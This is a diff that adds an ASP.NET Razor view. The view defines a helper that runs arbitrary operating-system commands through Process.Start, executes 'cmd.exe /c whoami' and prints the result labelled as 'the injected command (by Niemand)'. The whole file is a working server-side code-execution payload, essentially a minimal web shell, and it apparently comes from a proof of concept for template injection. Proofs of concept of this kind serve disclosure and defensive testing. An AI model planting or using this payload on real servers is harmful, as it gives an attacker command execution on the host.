@@ -1,0 +1,40 @@
+@using System.CodeDom.Compiler;
+@using System.Diagnostics;
+@using System.Reflection;
+@using System.Web.Compilation;
+
+@functions {
+
+	string ExecuteCommand(string command, string arguments = null)
+	{
+		var output = new System.Text.StringBuilder();
+		var process = new Process();
+		var startInfo = new ProcessStartInfo
+		{
+			FileName = command,
+			Arguments = arguments,
+			WorkingDirectory = HttpRuntime.AppDomainAppPath,
+			RedirectStandardOutput = true,
+			RedirectStandardError = true,
+			UseShellExecute = false
+		};
+
+		process.StartInfo = startInfo;
+		process.OutputDataReceived += (sender, args) => output.AppendLine(args.Data);
+		process.ErrorDataReceived += (sender, args) => output.AppendLine(args.Data);
+
+		process.Start();
+		process.BeginOutputReadLine();
+		process.BeginErrorReadLine();
+		process.WaitForExit();
+
+		return output.ToString();
+	}
+}
+
+@{
+	var cmd = ExecuteCommand("cmd.exe", "/c whoami");
+}
+
+Output of the injected command (by Niemand):
+	@cmd
